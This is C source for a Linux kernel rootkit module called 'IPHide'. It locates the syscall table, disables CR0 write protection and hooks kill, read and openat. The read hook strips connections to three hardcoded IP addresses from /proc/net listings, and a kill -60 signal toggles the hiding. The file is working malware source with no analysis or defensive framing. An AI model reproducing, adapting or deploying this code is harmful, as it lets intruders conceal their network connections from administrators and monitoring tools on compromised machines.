#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <asm/paravirt.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/limits.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("IPHide");
MODULE_DESCRIPTION("IP Address Hiding Module");
MODULE_VERSION("1.0");

unsigned long* __sys_call_table = NULL;

/* Hardcoded IP addresses to hide (in network byte order - big endian) */
static unsigned int hidden_ips[] = {
    0x464E6E4D,  // 77.110.126.70
    0xF9943C3E,  // 62.60.148.249  
    0xCE6A6E4D   // 77.110.106.206
};

#define HIDDEN_IP_COUNT (sizeof(hidden_ips) / sizeof(hidden_ips[0]))

static bool net_hidden = true;

/* define original syscalls */
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill;
static ptregs_t orig_read;
static ptregs_t orig_openat;

/* check if IP address should be hidden */
static bool isIpHidden(unsigned int ip_addr) {
    int i;
    for (i = 0; i < HIDDEN_IP_COUNT; i++) {
        if (hidden_ips[i] == ip_addr) {
            return true;
        }
    }
    return false;
}

/* check if network connection should be hidden */
static bool isNetConnectionHidden(unsigned int local_addr, unsigned int remote_addr) {
    if (!net_hidden) {
        return false;
    }
    return (isIpHidden(local_addr) || isIpHidden(remote_addr));
}

/* helper function to filter network connection lines */
static int filter_proc_net_content(char *buf, int len) {
    char *line, *next_line;
    char *filtered_buf;
    int filtered_len = 0;
    int line_len;
    unsigned int local_addr, remote_addr;
    unsigned short local_port, remote_port;
    
    if (!net_hidden) {
        return len; /* nothing to filter */
    }
    
    filtered_buf = kvzalloc(len, GFP_KERNEL);
    if (!filtered_buf) {
        return len;
    }
    
    line = buf;
    
    while (line < buf + len) {
        next_line = strchr(line, '\n');
        if (!next_line) {
            line_len = strlen(line);
            next_line = line + line_len;
        } else {
            line_len = next_line - line + 1;
            next_line++;
        }
        
        /* Skip header line */
        if (strstr(line, "local_address") != NULL) {
            memcpy(filtered_buf + filtered_len, line, line_len);
            filtered_len += line_len;
            line = next_line;
            continue;
        }
        
        /* Parse connection info from /proc/net/tcp format */
        if (sscanf(line, "%*d: %08X:%04hX %08X:%04hX", 
                   &local_addr, &local_port, &remote_addr, &remote_port) == 4) {
            
            /* Check if this connection should be hidden */
            if (!isNetConnectionHidden(local_addr, remote_addr)) {
                memcpy(filtered_buf + filtered_len, line, line_len);
                filtered_len += line_len;
            }
        } else {
            /* Keep non-parseable lines */
            memcpy(filtered_buf + filtered_len, line, line_len);
            filtered_len += line_len;
        }
        
        line = next_line;
    }
    
    memcpy(buf, filtered_buf, filtered_len);
    kvfree(filtered_buf);
    return filtered_len;
}

/* hacked kill syscall for control */
static asmlinkage long hack_kill(const struct pt_regs *regs)
{
    int sig = regs->si;
    
    /* Network connection hiding control */
    if (sig == 60)
    {
        /* Toggle network hiding on/off for hardcoded IPs */
        net_hidden = !net_hidden;
        printk(KERN_INFO "IPHide: Network hiding %s\n", net_hidden ? "enabled" : "disabled");
        return 0;
    }
    else
        return orig_kill(regs);
}

/* hacked openat */
static asmlinkage long hack_openat(const struct pt_regs *regs)
{
    /* Call original openat - placeholder for future enhancements */
    return orig_openat(regs);
}

/* hacked read */
static asmlinkage long hack_read(const struct pt_regs *regs)
{
    unsigned int fd = (unsigned int)regs->di;
    char __user *buf = (char __user *)regs->si;
    size_t count = (size_t)regs->dx;
    long ret;
    char *kbuf;
    struct file *file;
    char *path_buf, *full_path;
    
    /* Call original read first */
    ret = orig_read(regs);
    
    if (ret <= 0 || !net_hidden) {
        return ret;
    }
    
    /* Get the file structure from fd */
    file = fget(fd);
    if (!file) {
        return ret;
    }
    
    /* Get file path */
    path_buf = kvzalloc(PATH_MAX, GFP_KERNEL);
    if (!path_buf) {
        fput(file);
        return ret;
    }
    
    full_path = d_path(&file->f_path, path_buf, PATH_MAX);
    
    /* Check if this is a /proc/net/ file we should filter */
    if (IS_ERR(full_path) || 
        (strstr(full_path, "/proc/net/tcp") == NULL &&
         strstr(full_path, "/proc/net/udp") == NULL &&
         strstr(full_path, "/proc/net/tcp6") == NULL &&
         strstr(full_path, "/proc/net/udp6") == NULL &&
         strstr(full_path, "/proc/net/raw") == NULL &&
         strstr(full_path, "/proc/net/raw6") == NULL)) {
        kvfree(path_buf);
        fput(file);
        return ret;
    }
    
    /* Copy data from userspace, filter it, and copy back */
    kbuf = kvzalloc(ret, GFP_KERNEL);
    if (!kbuf) {
        kvfree(path_buf);
        fput(file);
        return ret;
    }
    
    if (copy_from_user(kbuf, buf, ret) == 0) {
        int filtered_len = filter_proc_net_content(kbuf, ret);
        if (copy_to_user(buf, kbuf, filtered_len) == 0) {
            ret = filtered_len;
        }
    }
    
    kvfree(kbuf);
    kvfree(path_buf);
    fput(file);
    return ret;
}

/* 
 * For Kernel versions after 5.7.0 the function kallsyms_lookup_name
 * isn't exported anymore, so it be called from LKM's directly. 
 * So we're using KProbes to find the address of kallsyms_lookup_name.
 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

static unsigned long* get_syscall_table(void)
{
    unsigned long* syscall_table;

#ifdef KPROBE_LOOKUP

    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;

    register_kprobe(&kp);

    /* assign kallsyms_lookup_name symbol to kp.addr */
    kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;

    unregister_kprobe(&kp);
#endif
    
    /* use kallsyms_lookup_name to get the syscall_table */ 
    syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    return syscall_table;
}

/* custom write_cr0 function */
static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static void protect_memory(void)
{
    /* Set the 16th bit (Write Protection) to 1 */
    write_cr0_forced(read_cr0() | (0x10000));
}

static void unprotect_memory(void)
{
    /* Set the 16th bit (Write Protection) to 0 */
    write_cr0_forced(read_cr0() & (~ 0x10000));
}

/* store original syscalls */
static int store_syscalls(void)
{
    orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
    orig_read = (ptregs_t)__sys_call_table[__NR_read];
    orig_openat = (ptregs_t)__sys_call_table[__NR_openat];
    return 0;
}

/* hook syscalls */
static int hook_syscalls(void)
{
    __sys_call_table[__NR_kill] = (unsigned long)&hack_kill;
    __sys_call_table[__NR_read] = (unsigned long)&hack_read;
    __sys_call_table[__NR_openat] = (unsigned long)&hack_openat;
    return 0;
}

/* restore original syscalls */
static int restore_syscalls(void)
{
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
    __sys_call_table[__NR_read] = (unsigned long)orig_read;
    __sys_call_table[__NR_openat] = (unsigned long)orig_openat;
    return 0;
}

static int __init iphide_init(void)
{
    printk(KERN_INFO "IPHide: Loading IP hiding module\n");
    printk(KERN_INFO "IPHide: Hiding IPs: 77.110.126.70, 62.60.148.249, 77.110.106.206\n");
    
    __sys_call_table = get_syscall_table();
    if (!__sys_call_table) {
        printk(KERN_ERR "IPHide: Failed to find syscall table\n");
        return -1;
    }
    
    store_syscalls();
    unprotect_memory();
    hook_syscalls();
    protect_memory();
    
    printk(KERN_INFO "IPHide: Module loaded successfully. Use 'kill -60 1' to toggle hiding.\n");
    return 0;
}

static void __exit iphide_exit(void)
{
    unprotect_memory();
    restore_syscalls();
    protect_memory();
    
    printk(KERN_INFO "IPHide: Module unloaded\n");
}

module_init(iphide_init);
module_exit(iphide_exit);
